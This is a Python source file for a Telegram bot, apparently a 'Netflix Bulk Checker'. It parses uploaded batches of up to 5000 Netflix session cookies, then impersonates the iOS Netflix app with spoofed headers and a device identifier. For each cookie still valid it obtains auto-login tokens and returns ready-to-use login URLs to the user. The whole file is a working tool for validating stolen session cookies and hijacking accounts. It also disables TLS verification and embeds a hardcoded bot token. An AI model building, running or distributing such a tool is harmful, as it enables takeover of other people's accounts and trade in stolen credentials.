import asyncio
import io
import json
import logging
import os
import re
import urllib.parse
import zipfile
from datetime import datetime

import httpx
import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from urllib3.exceptions import InsecureRequestWarning

# ── Config ─────────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ.get("BOT_TOKEN", "9221013683:AAGKJGFCsHU6WQhQYgznjNWxxb6u1AvR46Y")
MAX_CONCURRENT = 10
MAX_COOKIES    = 5000

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS     = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

# ── Cookie parsing ─────────────────────────────────────────────────────────────

def _decode_value(v: str) -> str:
    if "%" in v:
        try:
            return urllib.parse.unquote(v)
        except Exception:
            pass
    return v


def _parse_netscape_line(line: str) -> dict:
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def extract_cookie_dict(text: str) -> dict:
    out = {}

    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        out.update(_parse_netscape_line(line))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for c in data:
            n, v = c.get("name"), c.get("value")
            if n in COOKIE_KEYS and isinstance(v, str):
                out[n] = _decode_value(v)
    elif isinstance(data, dict):
        if any(k in data for k in COOKIE_KEYS):
            for k in COOKIE_KEYS:
                v = data.get(k)
                if isinstance(v, str):
                    out[k] = _decode_value(v)
        elif isinstance(data.get("cookies"), list):
            for c in data["cookies"]:
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    out[n] = _decode_value(v)

    for key in COOKIE_KEYS:
        if key in out:
            continue
        m = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if m:
            out[key] = _decode_value(m.group(1))

    return out


def _split_cookie_blocks(text: str) -> list[str]:
    text = text.strip()
    if not text:
        return []

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        blocks = []
        for item in data:
            if isinstance(item, list):
                blocks.append(json.dumps(item))
            elif isinstance(item, dict):
                if any(k in item for k in COOKIE_KEYS):
                    blocks.append(json.dumps(item))
                elif "name" in item and "value" in item:
                    blocks.append(json.dumps([item]))
        return blocks

    sections = re.split(r"\n{2,}", text)
    if len(sections) > 1:
        return [s.strip() for s in sections if s.strip()]

    return [line.strip() for line in text.splitlines() if line.strip()]


def extract_all_cookies(text: str) -> list[dict]:
    seen, results = set(), []
    for block in _split_cookie_blocks(text):
        cd  = extract_cookie_dict(block)
        nid = cd.get(REQUIRED_COOKIE)
        if nid and nid not in seen:
            seen.add(nid)
            results.append(cd)
    return results[:MAX_COOKIES]


def _read_bytes(data: bytes) -> str:
    for enc in ("utf-8", "utf-8-sig", "latin-1"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            continue
    return data.decode("utf-8", errors="replace")


def extract_cookies_from_file(filename: str, data: bytes) -> list[dict]:
    if filename.lower().endswith(".zip"):
        all_cookies, seen = [], set()
        try:
            with zipfile.ZipFile(io.BytesIO(data)) as zf:
                for member in zf.namelist():
                    mname = member.lower()
                    if mname.endswith((".txt", ".json", ".csv")) and not mname.startswith("__"):
                        text = _read_bytes(zf.read(member))
                        for cd in extract_all_cookies(text):
                            nid = cd.get(REQUIRED_COOKIE)
                            if nid and nid not in seen:
                                seen.add(nid)
                                all_cookies.append(cd)
        except zipfile.BadZipFile:
            pass
        return all_cookies[:MAX_COOKIES]

    return extract_all_cookies(_read_bytes(data))

# ── Netflix API — native async via httpx ───────────────────────────────────────

async def async_fetch(cookie_dict: dict, client: httpx.AsyncClient, sem: asyncio.Semaphore) -> dict:
    nid = cookie_dict.get(REQUIRED_COOKIE, "?")
    async with sem:
        try:
            headers = {**BASE_HEADERS, "Cookie": f"NetflixId={nid}"}
            resp    = await client.get(
                API_URL,
                params=QUERY_PARAMS,
                headers=headers,
                timeout=20,
            )
            resp.raise_for_status()
            data = resp.json()

            td = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {})
                .get("default") or {}
            )
            token   = td.get("token")
            expires = td.get("expires")

            if not token:
                return {"status": "dead", "netflix_id": nid, "token": None,
                        "expires": None, "error": "no token in response"}

            if isinstance(expires, int) and len(str(expires)) == 13:
                expires //= 1000

            return {"status": "live", "netflix_id": nid, "token": token,
                    "expires": expires, "error": None}

        except httpx.HTTPStatusError as e:
            code   = e.response.status_code
            status = "dead" if code in (401, 403) else "error"
            return {"status": status, "netflix_id": nid, "token": None,
                    "expires": None, "error": f"HTTP {code}"}
        except Exception as e:
            return {"status": "error", "netflix_id": nid, "token": None,
                    "expires": None, "error": str(e)[:120]}


def format_expiry(ts) -> str:
    if not isinstance(ts, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts)


def build_output(results: list[dict]) -> str:
    live  = [r for r in results if r["status"] == "live"]
    dead  = [r for r in results if r["status"] == "dead"]
    error = [r for r in results if r["status"] == "error"]

    ts    = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    lines = [
        f"Netflix Bulk Checker — {ts}",
        f"Total: {len(results)}  |  Live: {len(live)}  |  Dead: {len(dead)}  |  Error: {len(error)}",
        "",
        "=" * 60,
        "LIVE",
        "=" * 60,
    ]
    for r in live:
        lines.append(f"NetflixId : {r['netflix_id']}")
        lines.append(f"Login URL : https://netflix.com/?nftoken={r['token']}")
        lines.append(f"Expires   : {format_expiry(r['expires'])}")
        lines.append("")

    lines += ["=" * 60, "DEAD", "=" * 60]
    for r in dead:
        lines.append(r["netflix_id"])
    lines.append("")

    lines += ["=" * 60, "ERRORS", "=" * 60]
    for r in error:
        lines.append(f"{r['netflix_id']}  —  {r['error']}")
    lines.append("")

    return "\n".join(lines)

# ── Progress tracker ───────────────────────────────────────────────────────────

class ProgressReporter:
    def __init__(self, message, total: int):
        self.message    = message
        self.total      = total
        self.done       = 0
        self.live       = 0
        self._lock      = asyncio.Lock()
        self._last_edit = 0.0

    async def tick(self, result: dict):
        async with self._lock:
            self.done += 1
            if result["status"] == "live":
                self.live += 1
            now = asyncio.get_event_loop().time()
            if now - self._last_edit >= 3.0 or self.done == self.total:
                pct  = int(self.done / self.total * 100)
                bar  = "█" * (pct // 5) + "░" * (20 - pct // 5)
                try:
                    await self.message.edit_text(
                        f"⏳ Checking…\n"
                        f"[{bar}] {pct}%\n"
                        f"{self.done}/{self.total}  —  ✅ {self.live} live"
                    )
                    self._last_edit = now
                except Exception:
                    pass

# ── Bot handlers ───────────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send a cookie file to check all entries.\n\n"
        "Supported: .txt  .json  .zip\n\n"
        "Formats inside:\n"
        "• NetflixId=abc; SecureNetflixId=xyz  (one per line)\n"
        "• Netscape tab-delimited\n"
        "• JSON array [{name, value}, ...]\n"
        "• JSON array of arrays\n\n"
        "/help for more."
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"Drop any .txt / .json / .zip file.\n"
        f"Up to {MAX_COOKIES} cookies per batch.\n"
        f"{MAX_CONCURRENT} concurrent checks.\n\n"
        "Results file sent on completion.\n"
        "First live token posted directly in chat."
    )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc      = update.message.document
    filename = doc.file_name or "cookies.txt"

    status_msg = await update.message.reply_text("📥 Downloading…")

    buf = io.BytesIO()
    tg_file = await context.bot.get_file(doc.file_id)
    await tg_file.download_to_memory(buf)

    cookies = extract_cookies_from_file(filename, buf.getvalue())
    if not cookies:
        await status_msg.edit_text(
            "❌ No valid cookies found.\n"
            "File must contain NetflixId= entries."
        )
        return

    await status_msg.edit_text(f"🔍 {len(cookies)} cookies found. Checking…")

    sem      = asyncio.Semaphore(MAX_CONCURRENT)
    reporter = ProgressReporter(status_msg, len(cookies))

    # single shared async client — no SSL verify to match original
    async with httpx.AsyncClient(verify=False) as client:
        tasks   = [async_fetch(cd, client, sem) for cd in cookies]
        results = []
        for coro in asyncio.as_completed(tasks):
            r = await coro
            results.append(r)
            await reporter.tick(r)

    results.sort(key=lambda r: {"live": 0, "dead": 1, "error": 2}[r["status"]])

    live_results = [r for r in results if r["status"] == "live"]
    dead_count   = sum(1 for r in results if r["status"] == "dead")
    error_count  = sum(1 for r in results if r["status"] == "error")

    # First live token in chat
    if live_results:
        first = live_results[0]
        await update.message.reply_text(
            f"✅ First live token:\n\n"
            f"🔗 https://netflix.com/?nftoken={first['token']}\n"
            f"⏰ Expires: {format_expiry(first['expires'])}"
        )

    # Results file
    out_buf      = io.BytesIO(build_output(results).encode("utf-8"))
    out_buf.name = f"results_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"

    await status_msg.edit_text(
        f"📊 Done.\n"
        f"Total : {len(results)}\n"
        f"✅ Live  : {len(live_results)}\n"
        f"❌ Dead  : {dead_count}\n"
        f"⚠️ Error : {error_count}"
    )
    await update.message.reply_document(document=out_buf, filename=out_buf.name)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    if not text:
        return

    cd = extract_cookie_dict(text)
    if not cd.get(REQUIRED_COOKIE):
        await update.message.reply_text(
            "No NetflixId found.\n"
            "To check many at once, send a file."
        )
        return

    msg = await update.message.reply_text("Checking…")
    sem = asyncio.Semaphore(1)

    async with httpx.AsyncClient(verify=False) as client:
        result = await async_fetch(cd, client, sem)

    if result["status"] == "live":
        await msg.edit_text(
            f"✅ Live\n\n"
            f"🔗 https://netflix.com/?nftoken={result['token']}\n"
            f"⏰ Expires: {format_expiry(result['expires'])}"
        )
    elif result["status"] == "dead":
        await msg.edit_text("❌ Dead — cookie invalid or expired.")
    else:
        await msg.edit_text(f"⚠️ Error: {result['error']}")

# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help",  cmd_help))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    log.info("Bot running.")
    app.run_polling()


if __name__ == "__main__":
    main()